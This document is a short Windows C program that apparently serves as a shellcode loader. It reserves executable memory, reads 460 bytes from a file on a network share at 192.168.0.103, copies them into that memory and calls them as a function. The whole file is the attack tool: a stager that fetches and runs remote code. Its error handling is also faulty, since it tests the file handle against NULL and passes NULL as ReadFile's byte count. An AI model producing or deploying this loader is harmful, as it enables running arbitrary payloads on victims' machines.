#include <windows.h>
#include <stdio.h>

unsigned char buf[460] = "";

void readBin(const char* fileName){
	FILE *file;
	DWORD file_length;

	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == NULL)
	{
		printf("Error opening file: %d\n", GetLastError());
		exit(-99);
	}

	BOOL rez = ReadFile(hFile, &buf, 460, NULL, NULL);
	if(rez == FALSE)
	{
		printf("Error reading file: %d\n", GetLastError());
		exit(-98);
	}	
}

int main()
{
	LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	readBin("\\\\192.168.0.103\\share\\test.bin");
	memcpy(pAddr, buf, sizeof(buf));
	((void(*)())pAddr)();
	
}